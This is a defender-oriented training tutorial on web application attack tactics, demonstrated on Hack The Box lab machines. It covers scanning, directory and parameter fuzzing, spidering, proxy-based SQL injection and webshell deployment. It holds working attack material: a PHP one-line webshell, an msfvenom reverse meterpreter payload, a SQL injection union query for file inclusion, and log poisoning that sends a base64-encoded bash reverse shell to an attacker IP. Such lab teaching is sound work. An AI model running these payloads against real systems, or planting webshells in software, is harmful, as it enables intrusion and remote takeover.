# Web Application Attack Tactics

Most web applications are exposed to the Internet and therefore must have
mitigations in place for a wide range of reconnaissance and exploit attempts. As
defenders, we need to have a good understanding of how to detect this activity,
what type of tools are being used, and the scope and impact of each attempt observed.

This training document will explore the following web application attack tactics:

|Tactic|Description|
|-|-|
|[Vulnerability Scans](#vulnerability-scans)|Used to [Identify](#identify) and [Exploit](#exploit) web application vulnerabilities|
|[Dictionary Attacks](#dictionary-attacks)|Guessing and enumerating [Directories and Files](#directories-and-files), [Parameters](#parameters), and [Values](#values)|
|[Spidering](#spidering)|[Automated Mapping](#automated-mapping) of a web application and for [Gathering Data](#gathering-data) to support other attacks|
|[Passive Probing](#passive-probing)|Quiet [Passive Mapping](#passive-mapping) and slow [Manual Testing](#manual-testing) of a web application|
|[RCE via Webshell](#rce-via-webshell)|The [Deployment](#deployment) of custom webpages designed to provide code execution on the victim host|

<br>



![](images/Web%20Application%20Attack%20Tactics/meme001.PNG)

![](images/Web%20Application%20Attack%20Tactics/meme002.PNG)<br><br>

![](images/Web%20Application%20Attack%20Tactics/tactics001.png)<br><br>

## Vulnerability Scans

Vulnerability scanners test web applications for a number of different conditions
to determine if a vulnerability may be present.  They typically generate a large
amount of web traffic (200s, 401s, 403s, 404s, etc.) looking for multiple avenues
of attack and can be configured to either [Identify](#identify) or [Exploit](#exploit).

### Identify

Most vulnerability scanners are similar to OWASP's [ZAP]() in that you just
point it to a target and click start:

![](images/Web%20Application%20Attack%20Tactics/image040.png)<br><br>

The target here was a HTB machine named **Jarvis** and ZAP quickly finds a page using
a parameter vulnerable to SQL Injection:

![](images/Web%20Application%20Attack%20Tactics/image041.png)<br><br>

Some scanners specialize in one type of attack.  Here, [SQLMAP]() is
used to identify the same parameter as being vulnerable to SQLI:

```
sqlmap -u http://10.10.10.143/room.php?cod=1
```
![](images/Web%20Application%20Attack%20Tactics/image042.png)<br><br>


### Exploit

Many of these tools also provide the capability to exploit the vulnerabilities
that are discovered.  [SQLMAP]() makes it easy to dump passwords by adding
the `--passwords` parameter to the command:

![](images/Web%20Application%20Attack%20Tactics/image043.png)<br><br>

Or obtain a webshell using the `--os-shell` parameter:

![](images/Web%20Application%20Attack%20Tactics/image044.png)<br><br>

[BurpSuite]() is the most popular web scanner and its scanner module is only
available in the Pro version.

## Dictionary Attacks

Dictionary Attacks are used to enumerate a web application, identifying or
confirming the presence of the following:

- [Directories and Files](#directories-and-files)
- [Parameters](#parameters)
- [Values](#values)

Here is a web challenge named **Fuzzy** that can be used to demonstrate:

![](images/Web%20Application%20Attack%20Tactics/image021.png)<br><br>

### Directories and Files

[Gobuster]() can be used to identify a directory named `api`:

```
gobuster dir -u http://docker.hackthebox.eu:32324 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
```

![](images/Web%20Application%20Attack%20Tactics/image022.png)<br><br>

As well as a page named `action.php`:

```
gobuster dir -u http://docker.hackthebox.eu:32324/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
```

![](images/Web%20Application%20Attack%20Tactics/image023.png)<br><br>

### Parameters

Requesting the page gives us an error message stating a parameter is needed:

![](images/Web%20Application%20Attack%20Tactics/image027.png)<br><br>

Now [Wfuzz]() can be used to identify the name of the parameter:

```
wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hh 24  http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
```

![](images/Web%20Application%20Attack%20Tactics/image024.png)<br><br>

### Values

Once the parameter is submitted with the request, we get a different error
message:

![](images/Web%20Application%20Attack%20Tactics/image028.png)<br><br>

[Wfuzz]() can also find a value that works:

```
wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hh 27  http://docker.hackthebox.eu:42566/api/action.php?reset=FUZZ
```

![](images/Web%20Application%20Attack%20Tactics/image025.png)<br><br>

Requesting the `api/action.php` page with the correct parameter (`reset`) and
value (`20`) returns the flag:

![](images/Web%20Application%20Attack%20Tactics/image026.png)<br><br>

[BurpSuite]()'s **Sequencer** is used to test and analyze randomness of fields
in web requests, most commonly session IDs.  If the way the application generates
session IDs is found to be predictable, an attacker can impersonate a user and
gain unauthorized access to the application.

## Spidering

Spidering helps determine the scope and architecture of the web application.
It is not as loud as vulnerability scanning as it only follows existing
links discovered in the application and therefore generates mostly 200s.

This is used for mapping a website and/or gathering data for additional attacks:

- [Automated Mapping](#automated-mapping)
- [Gathering Data](#gathering-data)

### Automated Mapping

A map shows the structure of the site and serves as a starting point for different
web attacks.  Tools like [BurpSuite]() and OWASP's [ZAP]() will crawl all linked
content 5 links deep by default but can be configured to go deeper.

Here [ZAP]() spiders a website on the **Curling** machine and discovers 66 different
URLs in a few seconds:

![](images/Web%20Application%20Attack%20Tactics/image046.png)<br><br>

[Skipfish]() is another spidering tool that comes installed on Kali Linux:

![](images/Web%20Application%20Attack%20Tactics/image048.png)<br><br>

[Wget]() can also be used to spider a website:

```
wget --spider --force-html -r -l2 $url 2>&1 \
  | grep '^--' | awk '{ print $3 }' \
  | grep -v '\.\(css\|js\|png\|gif\|jpg\)$' \
  > urls.txt
```

![](images/Web%20Application%20Attack%20Tactics/image053.png)<br><br>


### Gathering Data

Tools like [Cewl]() perform spidering for the purpose of scraping interesting
information from the application such as usernames, passwords, and file paths.

Here [Cewl]() is used with [JTR]() to generate a list of passwords for the website
hosted on the **Curling** machine:

![](images/Web%20Application%20Attack%20Tactics/image046.png)<br><br>

The list can be used by a tool such as [BurpSuite]() to identify credentials that
provide access to application. Note the correct password returns a response
with a different status code (303):

![](images/Web%20Application%20Attack%20Tactics/image047.png)<br><br>

Here [Cewl]() is used to scrape a site for path names in a machine named
**Nibbles**:
```
cewl -d 5 -m 5 -w words.txt http://10.10.10.75 && cat words.txt
```
![](images/Web%20Application%20Attack%20Tactics/image031.png)<br><br>

These words can be fed to a tool like [Gobuster]() to discover new directories:

```
gobuster dir -u http://10.10.10.75 -w words.txt -t 50
```

![](images/Web%20Application%20Attack%20Tactics/image032.png)<br><br>

Point [Gobuster]() to the newly discovered `nibbleblog` directory to find pages
such as `admin.php`:

```
gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
```

![](images/Web%20Application%20Attack%20Tactics/image033.png)<br><br>

## Passive Probing

One of the hardest methods to detect is passive probing where an actor quietly
browses through all areas of a website as a normal user would. This is a way to
test specific web pages and forms, investigate source code, and inspect
associated network traffic without triggering alerts for abnormal behavior.

- [Passive Mapping](#passive-mapping)
- [Manual Testing](#manual-testing)


### Passive Mapping

[Burp]() can be configured to passively spider as you browse through a target
website, collecting information and page details----this looks exactly like
normal browsing and will be hard to detect.

The proxy tracks HTTP request and response history both to the target site and
third party sites to help profile the website’s functionality and client
interactions:

![](images/Web%20Application%20Attack%20Tactics/image077.png)<br><br>


### Manual Testing

The proxy in between the browser and the destination website allows inspection
and modification of the contents being transmitted in both directions.
Similar to a MITM, the browser may send a specific request to a website, but
when the proxy receives it, it can be changed to anything the attacker chooses.

This is used to evade client-side security controls that are carried out by the
browser as well as to easily perform fuzzing, password guessing attacks, and
injection attempts with otherwise normal-looking web requests.

Let's simulate this using another web challenge named **Cartographer**:

![](images/Web%20Application%20Attack%20Tactics/image015.png)<br><br>

[BurpSuite]()'s **Repeater** is used to manipulate any part of an HTTP request while
inspecting the resulting response from the server.  Watching the way a server
reacts to different requests, an attacker can discover vulnerabilities in
the application.

Enter credentials and submit the request so you can catch it and send it over to
the [Repeater](#repeater):

![](images/Web%20Application%20Attack%20Tactics/image016.png)<br><br>

Now you can manually change different fields of the request and submit them one
at a time monitoring the results.  Here a SQLI attempt doesn't work:

![](images/Web%20Application%20Attack%20Tactics/image017.png)<br><br>

But this one does and the response contains a cookie and new file path:

![](images/Web%20Application%20Attack%20Tactics/image018.png)<br><br>

Use [Repeater](#repeater) to submit another request containing the new file
path and issued cookie:

![](images/Web%20Application%20Attack%20Tactics/image019.png)<br><br>

The flag ends up being at `/panel.php?info=flag`:

![](images/Web%20Application%20Attack%20Tactics/image020.png)<br><br>


## RCE via Webshell

If one of the above tactics reveals a way for an actor to write to a file on the
web server, remote code execution via webshell is the most common way to leverage
the vulnerability.

A webshell is a file on a web server, written in a web scripting language (such
PHP, ASP, JavaScript, etc), that can be used to run commands on the system.
Requests are made to the web page containing the commands to be run and the web
server executes the supplied commands and returns the results in the response.

- [PHP Review](#php-review)
- [Deployment](#deployment)
- [Putting It All Together](#putting-it-all-together)

### PHP Review

PHP is a server scripting language used to create dynamic web pages. The code
below is an HTML web page that displays the word `Hello`:

```html
<!DOCTYPE html>
<html><header></header><body>
	<?php	echo "Hello";?>
</body></html>
```

The PHP code is executed on the server and returned to the user's browser as
plain HTML.

PHP uses functions, strings, integers, and objects just like any other scripting
language:

```php
$text = "Hello"
echo $text
define("MESSAGE", "Hello there")
echo MESSAGE
function SayHello($name) {
	echo MESSAGE $name;
}
SayHello("Andrew");
```

<br>

But a webshell doesn't need to be complex to work.  A PHP webshell in its most
basic form would be:

```html
<?php system($_GET['c']);?>
```

<br>

If a page contains this code, commands can be run on the server hosting it
by sending web requests that have the parameter `c` set to an
operating system command.

```
wget http://webpage.com/index.php?c=<command>
```

### Deployment

Using our previous example with the **Curling** machine, after accessing the
console it is possible to add arbitrary code to any webpage on the site. Adding
a small one-liner is all that is required to get code execution:

![](images/Web%20Application%20Attack%20Tactics/image049.png)<br><br>

When a command is provided via the `c` parameter the results are returned and
the rest of the page is loaded normally:

![](images/Web%20Application%20Attack%20Tactics/image050.png)<br><br>

With the ability to write to a page, any combination of commands can be
configured to run when the page loads.  These download a reverse shell from
the attacking machine, make it executable, and run it:

![](images/Web%20Application%20Attack%20Tactics/image052.png)<br><br>

Discovering an admin page protected with default credentials like on the
**Nibbles** machine is another common way webshells get deployed. Here is
another simple HTML/PHP webshell:

![](images/Web%20Application%20Attack%20Tactics/image034.png)<br><br>

Trying credentials `admin:nibbles` grants us access to the application which
can then be used to upload the file and run commands with it:

![](images/Web%20Application%20Attack%20Tactics/image035.png)<br><br>

The `DBadmin` credentials obtained from the **Jarvis** box provide a way to
write a simple webshell to the server using a SQL command:

![](images/Web%20Application%20Attack%20Tactics/image045.png)<br><br>

Another method is finding a web shell already installed like on the **Bashed**
machine.  Here [Gobuster]() performs a dictionary attack on directories and
finds one named `dev`:

![](images/Web%20Application%20Attack%20Tactics/image029.png)<br><br>

In that directory is a webshell named `phpbash.php` that can be used to run
commands on the server:

![](images/Web%20Application%20Attack%20Tactics/image030.png)<br><br>

Webshells can also be disguised as other files and written to the server using
legitimate upload methods in the application.  On the HTB machine named
**Popcorn**, it is possible to sign up for an account, log in, and upload a
webshell by including an image file extension (`.png`) in the filename.

First use `msfvenom` to create a php reverse meterpreter shell:

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.95 LPORT=9999 > shell.png.php
```

<br>

Now upload it as a screenshot:

![](images/Web%20Application%20Attack%20Tactics/image060.png)<br><br>

You also must catch the request with [BurpSuite]() and change the `Content-Type`
to `image/png`:

![](images/Web%20Application%20Attack%20Tactics/image061.png)<br><br>

When the page is visited, the PHP code runs and provides a reverse tcp
meterpreter shell to the attacking machine:

![](images/Web%20Application%20Attack%20Tactics/image062.png)<br><br>

### Putting It All Together

The box **Unattended** is a great example of combining multiple vulnerabilities
together to deploy a webshell.

First, there is a directory traversal vulnerability that allows us to download
a file that is not supposed to be exposed on the server:

```
echo "10.10.10.126 www.nestedflanders.htb" >> /etc/hosts
wget --no-check-certificate https://www.nestedflanders.htb/dev../html/index.php
```

This file contains credentials:

![](images/Web%20Application%20Attack%20Tactics/image063.png)<br><br>

This file is also a copy of the main page `/index.php` which we can identify
as vulnerable to SQLI with [Sqlmap]():

![](images/Web%20Application%20Attack%20Tactics/image064.png)<br><br>

Using the correct query will allow Local File Inclusion (LFI) attacks which
means the SQL server will return the contents of arbitrary files on the web
server's filesystem such as `/etc/passwd`:

```
https://www.nestedflanders.htb/index.php?id=25' union select "main' union select '/etc/passwd' LIMIT 1,1;-- -- LIMIT 1,1;-- -
```

![](images/Web%20Application%20Attack%20Tactics/image065.png)<br><br>

With LFI, you can read any file on the system (execute any php on any page).  Next
step is to get some PHP code on a page so we can visit it and execute it.

Most web servers log web requests and this one is no different.  Since we control
what user agent string gets logged, we can potentially write PHP code to the
server's access log file at `/var/log/nginx/access.log`:

![](images/Web%20Application%20Attack%20Tactics/image066.png)<br><br>

Change your user agent string to a PHP line of code that executes the `whoami` command:

```bash
wget --no-check-certificate https://www.nestedflanders.htb/index.php -U "<?php system('whoami'); ?>"
```

<br>

When we use the SQLI query to view the internal log file, the code we wrote to
the logfile is rendered and executed by the server giving us the output of the
`whoami` command:

![](images/Web%20Application%20Attack%20Tactics/image067.png)<br><br>

To get a shell, we substitute the `whoami` command for a base64 encoded
bash command:

```bash
echo -n 'bash -i >& /dev/tcp/10.10.16.95/443 0>&1 &' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NS80NDMgMD4mMSAm

wget --no-check-certificate https://www.nestedflanders.htb/index.php -U "<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NS80NDMgMD4mMSAm | base64 -d | bash'); ?>"
```

<br>

And when the page is visited, the code executes and sends the attacking
machine a reverse shell:

![](images/Web%20Application%20Attack%20Tactics/image068.png)<br><br>

There is a second way to use LFI on this box--open the browser debugger and
grab your session id which is stored in a cookie:

![](images/Web%20Application%20Attack%20Tactics/image069.png)<br><br>

Use a SQLI query to show the contents of `/var/log/php/sessions/sess_<your-session-id>`.
Since session ids are also logged to a file, we can write PHP code to this
file as well:

![](images/Web%20Application%20Attack%20Tactics/image070.png)<br><br>

Catch one of your web requests with [BurpSuite]() and add the following PHP
code to the cookie:

![](images/Web%20Application%20Attack%20Tactics/image072.png)<br><br>

Forward it on to the server and when you visit the page that was written to, you
can see the code executed:

![](images/Web%20Application%20Attack%20Tactics/image073.png)<br><br>
